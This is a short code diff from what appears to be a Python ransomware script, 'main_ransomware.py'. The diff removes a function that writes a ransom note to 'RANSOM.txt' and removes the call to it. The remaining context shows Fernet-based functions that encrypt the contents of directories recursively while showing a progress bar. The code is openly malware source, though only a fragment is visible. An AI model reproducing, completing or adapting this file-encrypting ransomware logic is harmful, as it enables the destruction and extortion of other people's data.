@@ -18,11 +18,6 @@ from cryptography.fernet import Fernet
 import os 
 
 
-def message():
-    with open('RANSOM.txt', 'w') as ransom:
-        ransom.write(key_art)
-        ransom.write("Edit the message in main_ransomware.py")
-
 def encrypt(dir):
     content = os.listdir(dir)
     keys = []
@@ -60,7 +55,6 @@ def encrypt(dir):
         print(loadbar[0: os.get_terminal_size().columns ], end="\r")
 
     print("\n")
-    message()
 
 
 def recursive_encrypt(root):
